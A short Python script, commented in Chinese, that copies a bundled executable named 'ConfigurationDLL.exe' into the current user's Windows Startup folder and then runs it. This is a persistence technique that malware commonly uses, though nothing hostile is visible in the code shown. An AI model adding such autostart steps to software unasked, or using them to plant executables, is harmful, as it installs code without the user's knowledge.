import pathlib
import shutil
import os
import subprocess



# 获取Windows启动文件夹路径
def get_startup_folder_path():
    # 获取当前用户的用户名
    username = os.getlogin()
    # 构建启动文件夹路径
    startup_folder_path = f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    return startup_folder_path


folder = pathlib.Path(__file__).parent.resolve()
# 源文件路径
source_file = os.path.join(folder, "exe", "ConfigurationDLL.exe")

# 目标目录路径（确保目录存在）
destination_dir = get_startup_folder_path() + '\\'

# 构建目标文件路径
destination_file = os.path.join(destination_dir, os.path.basename(source_file))

# 检查目标目录是否存在，如果不存在则创建它
if not os.path.exists(destination_dir):
    os.makedirs(destination_dir)

# 复制文件到指定目录
try:
    shutil.copyfile(source_file, destination_file)
    print(f"文件已成功复制到 {destination_dir}")
except Exception as e:
    print(f"复制文件时出错: {e}")


# 指定要运行的.exe程序的路径和任何必要的参数
exe_path = source_file
arguments = []  # 如果.exe程序需要参数，可以在这里添加

# 使用subprocess.run()来运行程序
# 注意：如果你不需要捕获输出或错误，可以省略capture_output=True和text=True
result = subprocess.run([exe_path] + arguments, capture_output=True, text=True)

# 输出程序的返回码
print(f'Return code: {result.returncode}')

# 输出程序的标准输出（如果有的话）
print(f'Standard Output:\n{result.stdout}')

# 输出程序的标准错误（如果有的话）
print(f'Standard Error:\n{result.stderr}')


